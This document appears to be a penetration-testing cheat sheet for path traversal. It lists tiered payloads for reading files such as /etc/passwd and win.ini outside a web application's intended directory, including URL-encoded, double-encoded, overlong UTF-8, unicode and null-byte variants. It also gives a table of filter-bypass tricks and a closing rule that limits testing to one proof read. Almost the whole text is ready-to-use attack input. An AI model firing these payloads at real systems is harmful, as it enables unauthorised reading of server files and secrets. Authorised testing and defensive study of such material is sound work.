# Path Traversal

Distinct from LFI escalation — here the goal is reaching a file outside the intended directory (static file servers, download/export endpoints, `?file=`, archive extraction, `Content-Disposition` downloaders). Pair with `../bypass-tables.md`.

## Tier 1 — Basic traversal
```
../../../../etc/passwd
..\..\..\..\windows\win.ini            # Windows
/etc/passwd                            # absolute path, if the app prepends nothing
....//....//etc/passwd                 # non-recursive strip bypass
..././..././etc/passwd
```

## Tier 2 — Encoding
When `../` is filtered.
```
%2e%2e%2f%2e%2e%2fetc%2fpasswd         # url-encode ../
%2e%2e/%2e%2e/etc/passwd               # partial
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c                     # backslash (windows)
```

## Tier 3 — Double / over-long / unicode encoding
```
%252e%252e%252f                        # double-encoded ../   (decoded twice)
%c0%ae%c0%ae/                          # overlong UTF-8 for '.'  (legacy parsers)
%e0%80%ae                              # overlong '.'
..%c0%af..%c0%af                       # overlong '/'
%uff0e%uff0e%u2215                     # unicode fullwidth dot / division slash
```

## Bypass table (quick)
| Filter behavior            | Try                                                    |
|----------------------------|--------------------------------------------------------|
| Strips `../` once          | `....//`  `..././`  `....\/`                            |
| Blocks `../` literal       | url-encode `%2e%2e%2f`, double `%252e%252e%252f`        |
| Requires leading dir       | `valid_dir/../../../etc/passwd`                         |
| Appends extension `.php`   | null byte `%00` (legacy), or `?` / `#` / `;` truncation |
| Requires expected ext      | `../../etc/passwd%00.png`  (legacy PHP/Java)            |
| Normalizes then checks     | overlong UTF-8 / unicode slash                          |
| Blocks `/`                 | backslash `\` on Windows/mixed stacks                   |
| WAF on `etc/passwd`        | `etc/./passwd`, `et%63/passwd`                          |

## Absolute-path & null-byte
```
file=/etc/passwd
file=file:///etc/passwd
file=../../../../../../../../etc/passwd     # over-climb (extra ../ harmless)
file=../../etc/passwd%00                     # null byte (Java/PHP legacy)
```

## Stop when
One read of a non-sensitive file that is provably outside the intended root (`/etc/hostname`, `/etc/passwd`, or `win.ini`). Capture the request + response showing the file contents. Do not enumerate the filesystem or pull secrets/keys — one out-of-root read proves the traversal. Stop.
